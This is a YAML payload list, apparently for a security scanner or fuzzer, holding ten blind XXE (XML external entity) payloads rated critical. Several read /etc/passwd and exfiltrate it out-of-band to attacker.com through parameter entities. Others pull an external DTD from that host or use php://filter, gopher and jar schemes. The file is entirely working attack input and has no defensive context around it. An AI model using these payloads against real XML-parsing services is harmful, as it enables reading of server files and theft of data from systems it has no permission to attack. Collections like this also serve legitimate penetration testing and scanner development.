  blind_xxe:
    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;]><root>test</root>"
      description: "Blind XXE with external DTD"
      severity: critical
      tags: [blind, external_dtd]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe.dtd\">%xxe;%param1;]><root>test</root>"
      description: "Blind XXE with parameter entity"
      severity: critical
      tags: [blind, parameter_entity]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>\">%eval;%exfil;]><root>test</root>"
      description: "Blind XXE OOB exfiltration"
      severity: critical
      tags: [blind, oob, exfil]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://attacker.com/?data=%file;\">'>%eval;%exfil;]><root>test</root>"
      description: "Blind XXE OOB variant"
      severity: critical
      tags: [blind, oob, exfil]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % data SYSTEM \"file:///etc/passwd\"><!ENTITY % param1 \"<!ENTITY exfil SYSTEM 'http://attacker.com/?d=%data;'>\">%param1;]><root>&exfil;</root>"
      description: "Blind XXE data exfil"
      severity: critical
      tags: [blind, oob, exfil]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % start \"<![CDATA[\"><!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % end \"]]>\"><!ENTITY % dtd SYSTEM \"http://attacker.com/xxe.dtd\">%dtd;]><root>&send;</root>"
      description: "Blind XXECDATA exfil"
      severity: critical
      tags: [blind, cdata, exfil]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://attacker.com/xxe.dtd\">%dtd;]><root>test</root>"
      description: "Blind XXE external DTD file"
      severity: critical
      tags: [blind, external_dtd]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">%xxe;]><root>test</root>"
      description: "Blind XXE PHP filter base64"
      severity: critical
      tags: [blind, php, base64]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"gopher://attacker.com/\">%xxe;]><root>test</root>"
      description: "Blind XXE gopher"
      severity: critical
      tags: [blind, gopher]

    - value: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"jar:http://attacker.com/file.jar!/\">%xxe;]><root>test</root>"
      description: "Blind XXE jar"
      severity: critical
      tags: [blind, jar]

